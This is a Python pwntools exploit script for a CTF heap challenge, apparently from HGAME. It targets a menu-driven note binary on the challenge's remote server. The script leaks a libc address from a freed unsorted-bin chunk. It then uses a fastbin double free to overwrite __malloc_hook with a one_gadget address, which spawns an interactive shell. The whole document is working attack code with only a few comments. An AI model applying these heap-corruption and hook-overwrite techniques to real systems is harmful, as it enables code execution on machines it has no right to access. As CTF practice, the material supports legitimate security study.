from pwn import *
import time

#context.log_level = 'debug'

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path, libc_path = "./vuln", "./libc.so.6"
if f_remote:
   vuln_path = "./vuln.bak"
   #libc_path = "/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so"

success(libc_path)
elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    ld_path = "./ld-2.31.so"
    # io = process([vuln_path])
    # io = process([vuln_path], env={"LD_PRELOAD": libc_path})
    io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("week-1.hgame.lwsec.cn", 32461)

def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def add(idx, size, content):
    io.sendlineafter(">", "1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))
    io.sendlineafter("Content: ", content)


def delete(idx):
    io.sendlineafter(">", "2")
    io.sendlineafter("Index: ", str(idx))


def show(idx):
    io.sendlineafter(">", "3")
    io.sendlineafter("Index: ", str(idx))


for i in range(8):
    add(i, 0x90, "abc")
add(8, 0x20, "")

for i in range(8):
    delete(i)
show(7)

libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
success("main_arena -> " + hex(libcmain_offset))

main_arena_offset = 0x7f0aea54abe0 - 0x7f0aea35e000
libc.address = libcmain_offset - main_arena_offset
success("libc address -> " + hex(libc.address))
_malloc_hook_address = libc.symbols["__malloc_hook"]
success("malloc_hook -> " + hex(_malloc_hook_address))
_free_hook_address = libc.symbols["__free_hook"]
success("free_hook -> " + hex(_free_hook_address))
realloc_address = libc.sym['realloc']
success("realloc_address -> " + hex(realloc_address))
success("system -> " + hex(libc.symbols["system"]))

ddebug()
for i in range(7):
    add(i, 0x60, "abc")
add(7, 0x60, "abc")
add(8, 0x60, "abc")
add(9, 0x60, "abc")

pause()
for i in range(7):
    delete(i)

pause()
delete(7)
delete(8)
delete(7)

for i in range(7):
    add(i, 0x60, "abc")

add(7, 0x60, p64(_malloc_hook_address))

# fastbin --> tcache (0x70)   tcache_entry[5](3): 0x560f6f69aa60 --> 0x560f6f69a9f0 --> 0x7f506946cb70
add(8, 0x60, p64(0))

add(9, 0x60, p64(0))

one = libc.address + 0xe3b01
add(10, 0x60, p64(one))

io.sendlineafter(">", "1")
io.sendlineafter("Index: ", '8')
io.sendlineafter("Size: ", "0x60")

io.interactive()
